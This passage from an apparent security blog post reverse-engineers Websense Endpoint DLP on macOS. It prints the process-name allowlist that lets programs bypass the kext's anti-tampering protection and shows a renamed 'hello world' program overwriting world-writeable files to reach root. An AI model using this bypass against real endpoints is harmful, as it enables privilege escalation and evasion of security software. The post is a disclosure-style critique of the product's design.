&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;n&#34;&gt;time_str&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;time&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;strftime&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;%Y-%m-&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;%d&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt; %H-%M-%S&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;time&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;localtime&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;())&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;n&#34;&gt;string_to_write&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;%s&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt; pyLogger debug message: &lt;/span&gt;&lt;span class=&#34;si&#34;&gt;%s&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;%&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;time_str&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;massage_to_write&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;bp&#34;&gt;self&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;myMutex&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;acquire&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;n&#34;&gt;log_debug_file&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;codecs&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;open&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;bp&#34;&gt;self&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;fileName&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;a&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;utf-16&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;n&#34;&gt;log_debug_file&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;write&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;string_to_write&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;n&#34;&gt;log_debug_file&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;write&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\r\n&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;n&#34;&gt;log_debug_file&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;close&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;bp&#34;&gt;self&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;myMutex&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;release&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# okay decompiling ./EPClassifier/policies/scripts/pyLogger.pyc&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;its-all-world-writeable-or-is-it&#34;&gt;
    &lt;a href=&#34;#its-all-world-writeable-or-is-it&#34;&gt;
	It&amp;rsquo;s all world-writeable, or is it?
    &lt;/a&gt;
&lt;/h2&gt;
&lt;p&gt;That’s fun, I thought and then I saw the file permissions.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-console&#34; data-lang=&#34;console&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;gp&#34;&gt;$&lt;/span&gt; ls -l ./EPClassifier/policies/scripts/pyLogger.pyc
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;-rw-rw-rw-  1 root  admin  1130 Nov 14  2017 ./EPClassifier/policies/scripts/pyLogger.pyc
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Is it really a good idea to have system security software installed with world-writeable files?&lt;/p&gt;
&lt;p&gt;I asked in our internal security forum, and apparently WebSense has an anti-tampering protection.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-console&#34; data-lang=&#34;console&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;gp&#34;&gt;$&lt;/span&gt; kextstat &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; grep -v com.apple &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; awk &lt;span class=&#34;s1&#34;&gt;&amp;#39;{ print $1, $6 }&amp;#39;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;Index Name
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;15 com.displaylink.driver.DisplayLinkDriver
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;91 com.asix.driver.ax88179-178a
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;131 com.Cylance.CyProtectDrvOSX
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;146 com.websense.endpoint.process.kpi
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;147 com.websense.endpoint.process
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;148 com.websense.endpoint.dlp
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;The number 148, &lt;code&gt;com.websense.endpoint.dlp&lt;/code&gt;, is the kernel module that &amp;ldquo;protects&amp;rdquo; these files: As a user or as root, when you try to modify one of the world writeable files, the module intercepts and blocks the call.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-console&#34; data-lang=&#34;console&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;com.websense.endpoint.dlp: [WARNING:ws_anti.c:364] Blocking the attempt to modify or delete /Library/Application Support/Websense Endpoint/EPClassifier/python/lib/python2.5/sqlite3/__init__.py, pid:73968, process:vim, action: 0x4
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Challenge accepted.&lt;/p&gt;
&lt;h2 id=&#34;a-kext-is-just-code-lets-have-a-look&#34;&gt;
    &lt;a href=&#34;#a-kext-is-just-code-lets-have-a-look&#34;&gt;
	A kext is just code. Let&amp;rsquo;s have a look.
    &lt;/a&gt;
&lt;/h2&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-console&#34; data-lang=&#34;console&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;gp&#34;&gt;$&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;pwd&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;.../Websense Endpoint/DLP/WebsenseEndpointDLP.kext/Contents/MacOS
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;&lt;/span&gt;&lt;span class=&#34;gp&#34;&gt;$&lt;/span&gt; ls -l
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;total 440
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;-rwxr-xr-x  1 kris  staff  223056 Jun  4 23:52 WebsenseEndpointDLP
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;That’s the kext, the one which registers itself as &lt;code&gt;com.websense.endpoint.dlp&lt;/code&gt; in &lt;code&gt;kextstat&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;We can load it into &lt;a href=&#34;https://www.hopperapp.com/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;Hopper&lt;/a&gt;

. Hopper is a $99 IDAPro Clone with a nice Python API. You can also use the free version of IDApro, or the NSA Ghidra to achieve the same.&lt;/p&gt;
&lt;p&gt;Turns out, the kext is delivered with a full symbol table. Here is what you see when you start Hopper, drag the kext into it and click on the symbol that inits the kernel extension:&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://blog.koehntopp.info/uploads/2018/06/hopper-01.jpg&#34;&gt;&lt;p class=&#34;md__image&#34;&gt;
  &lt;img src=&#34;https://blog.koehntopp.info/uploads/2018/06/hopper-01.jpg&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;

&lt;/a&gt;

&lt;/p&gt;
&lt;p&gt;&lt;em&gt;Initial glance at the kext after loading. We have symbols. That&amp;rsquo;s almost like cheating.&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;There is a tempting call to &lt;code&gt;_ws_anti_tampering_initialize()&lt;/code&gt;, but I have learned to do things differently a long time ago. The error message read &amp;ldquo;Blocking the attempt to modify or delete&amp;rdquo;.&lt;/p&gt;
&lt;p&gt;That&amp;rsquo;s here:&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://blog.koehntopp.info/uploads/2018/06/hopper-02.jpg&#34;&gt;&lt;p class=&#34;md__image&#34;&gt;
  &lt;img src=&#34;https://blog.koehntopp.info/uploads/2018/06/hopper-02.jpg&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;

&lt;/a&gt;

&lt;/p&gt;
&lt;p&gt;&lt;em&gt;Two places in vnode_listener_callback_9135&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;We are looking at a vnode listener, which is a type of &lt;a href=&#34;https://www.apriorit.com/dev-blog/411-mac-os-x-kauth-listeners&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;kauth&lt;/a&gt;

 listener, which is a MacOS thing to monitor or block access to files. It’s what all the Cybersnakeoil is using. It’s also what’s making your &lt;code&gt;git checkout&lt;/code&gt; slow.&lt;/p&gt;
&lt;p&gt;And here is the callback:&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://blog.koehntopp.info/uploads/2018/06/hopper-03.jpg&#34;&gt;&lt;p class=&#34;md__image&#34;&gt;
  &lt;img src=&#34;https://blog.koehntopp.info/uploads/2018/06/hopper-03.jpg&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;

&lt;/a&gt;

&lt;/p&gt;
&lt;p&gt;&lt;em&gt;Read the highlighted code&amp;hellip;&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;There is little going on here until we hit the highlighted code. You can’t see all of it, but that does not matter.&lt;/p&gt;
&lt;p&gt;The code calls &lt;a href=&#34;https://developer.apple.com/documentation/kernel/1488959-proc_name?language=objc&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;proc_name()&lt;/a&gt;

, which gets the current process title in the kernel context. It then compares this name to a list of approved process names.&lt;/p&gt;
&lt;p&gt;If there is a match, no blockage happens from the kext.&lt;/p&gt;
&lt;p&gt;So, anything called&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;EndPointClassifier&lt;/li&gt;
&lt;li&gt;kvoop&lt;/li&gt;
&lt;li&gt;CryptoTool&lt;/li&gt;
&lt;li&gt;InstallerTools&lt;/li&gt;
&lt;li&gt;Websense Endpoint&lt;/li&gt;
&lt;li&gt;TRITON AP-ENDPOINT&lt;/li&gt;
&lt;li&gt;Websense Endpoint Helper&lt;/li&gt;
&lt;li&gt;DLPHelperService&lt;/li&gt;
&lt;li&gt;efw_cache_update&lt;/li&gt;
&lt;li&gt;installd&lt;/li&gt;
&lt;li&gt;installer&lt;/li&gt;
&lt;li&gt;rc.deferred_install&lt;/li&gt;
&lt;li&gt;shove&lt;/li&gt;
&lt;li&gt;Google Chrome&lt;/li&gt;
&lt;li&gt;Websense Endpoint RF Notification&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;is approved to bypass the protection afforded by kext 148.&lt;/p&gt;
&lt;p&gt;That makes a lot of sense, if you look at it - how are they going to update their code out in the world? Some programs must be allowed to write to it – that&amp;rsquo;s how &lt;code&gt;InstallerTools&lt;/code&gt;, &lt;code&gt;CryptoTool&lt;/code&gt;, &lt;code&gt;installd&lt;/code&gt;, &lt;code&gt;installer&lt;/code&gt; and &lt;code&gt;rc.deferred_install&lt;/code&gt; as well as &lt;code&gt;shove&lt;/code&gt; end up on this list.&lt;/p&gt;
&lt;p&gt;The others are likely convenience for Develoeprs that &amp;ldquo;accidentally&amp;rdquo; (through bad development processes) made it out into production code. It&amp;rsquo;s likely that the bad permissions also ended up being shipped the same way – it makes a lot of sense for a developer to have these files world-writeable all the time when they are developing this product.&lt;/p&gt;
&lt;p&gt;In any case, other rules in the rest of the kernel still apply, so file permissions still work. But WebSense delivered a bunch of files world-writeable, relying on their kext to protect their application.&lt;/p&gt;
&lt;p&gt;They do load these world-writeable files into their python process, which runs as root, and happily execute them. So this is our hook: We overwrite any of these files with our own code, using our own program which we name &lt;code&gt;kvoop&lt;/code&gt; (or anything from the list above), and then restart the machine. As it starts up, it loads our code and the box is ours.&lt;/p&gt;
&lt;p&gt;We get privilege escalation from local user to system administrator.&lt;/p&gt;
&lt;h2 id=&#34;we-write-a-proof-of-concept&#34;&gt;
    &lt;a href=&#34;#we-write-a-proof-of-concept&#34;&gt;
	We write a proof-of-concept
    &lt;/a&gt;
&lt;/h2&gt;
&lt;p&gt;Can I prove that I can circumvent their protection?&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;err&#34;&gt;$&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;cat&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;probe&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;c&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cp&#34;&gt;#include&lt;/span&gt; &lt;span class=&#34;cpf&#34;&gt;&amp;lt;stdio.h&amp;gt;&lt;/span&gt;&lt;span class=&#34;cp&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cp&#34;&gt;#include&lt;/span&gt; &lt;span class=&#34;cpf&#34;&gt;&amp;lt;stdlib.h&amp;gt;&lt;/span&gt;&lt;span class=&#34;cp&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cp&#34;&gt;#include&lt;/span&gt; &lt;span class=&#34;cpf&#34;&gt;&amp;lt;unistd.h&amp;gt;&lt;/span&gt;&lt;span class=&#34;cp&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cp&#34;&gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kt&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;main&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;FILE&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;fp&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;fopen&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;version.plist&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s&#34;&gt;&amp;#34;w&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;!&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;fp&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;n&#34;&gt;perror&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;Can&amp;#39;t fopen&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\n&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;       &lt;span class=&#34;n&#34;&gt;exit&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;fprintf&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;fp&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s&#34;&gt;&amp;#34;Hello, world&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\n&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;fclose&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;fp&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;sleep&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;60&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;exit&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;This is a slight variation of the “hello world” program: It opens a file version.plist, writes &amp;ldquo;Hello, world&amp;rdquo; to the file, sleeps a minute and exits.&lt;/p&gt;
&lt;p&gt;First, expected behavior: Boy meets file, file is world writeable, boy tries to write file, and fails due to the kext doing the kauth thing and interfering.&lt;/p&gt;
&lt;p&gt;Hackerterrorcybercyber averted.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-console&#34; data-lang=&#34;console&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;gp&#34;&gt;$&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;pwd&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;/Library/Application Support/Websense Endpoint/EPClassifier/python/Resources
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;&lt;/span&gt;&lt;span class=&#34;gp&#34;&gt;$&lt;/span&gt; ls -l version.plist 
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;-rwxrwxrwx 1 root admin 454 May 26 07:13 version.plist
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;&lt;/span&gt;&lt;span class=&#34;gp&#34;&gt;$&lt;/span&gt; &amp;gt; version.plist
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;-bash: version.plist: Permission denied
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Boy reverses the kext, reads the list of privileged filenames, names his &amp;ldquo;hello world&amp;rdquo; program kvoop from the list of privileged filenames and lo and behold:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-console&#34; data-lang=&#34;console&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;gp&#34;&gt;$&lt;/span&gt; kvoop
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;^C
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;&lt;/span&gt;&lt;span class=&#34;gp&#34;&gt;$&lt;/span&gt; cat version.plist
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;Hello, world
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;I pwn.&lt;/p&gt;
&lt;h2 id=&#34;other-observations&#34;&gt;
    &lt;a href=&#34;#other-observations&#34;&gt;
	Other observations
    &lt;/a&gt;
&lt;/h2&gt;
&lt;p&gt;Websense DLP is one of the kind of products that inject a shared library (a Macos &lt;code&gt;.dylib&lt;/code&gt;) into other processes. In our case, Chrome and Firefox are being targeted. This is not a stable interface, and &lt;a href=&#34;https://www.techradar.com/news/google-chrome-keeps-crashing-it-might-be-your-antivirus&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;Chrome or Firefox may crash&lt;/a&gt;

.&lt;/p&gt;
&lt;p&gt;Websense DLP relies on the &lt;code&gt;prog_name()&lt;/code&gt; not only for exceptions in the kauth handler, but also in the selection of binaries to target for injection. For example, if I write a &amp;ldquo;hello world&amp;rdquo; program and rename it to &lt;code&gt;firefox&lt;/code&gt;, there is a lot of commotion in the system log: Websense DLP tries to inject its libraries into my &amp;ldquo;hello world&amp;rdquo; program, which it mistakes for Firefox due to the program name, and fails, noisly.&lt;/p&gt;
&lt;p&gt;The same works in reverse: A firefox binary that is not named &lt;code&gt;firefox&lt;/code&gt; is not recognized and does not get the shared library injected, so it flies under the radar.&lt;/p&gt;
&lt;p&gt;One wonders what the actual threat model is that this is supposed to protect against.&lt;/p&gt;
&lt;h2 id=&#34;tldr&#34;&gt;
    &lt;a href=&#34;#tldr&#34;&gt;
	TL;DR
    &lt;/a&gt;
&lt;/h2&gt;
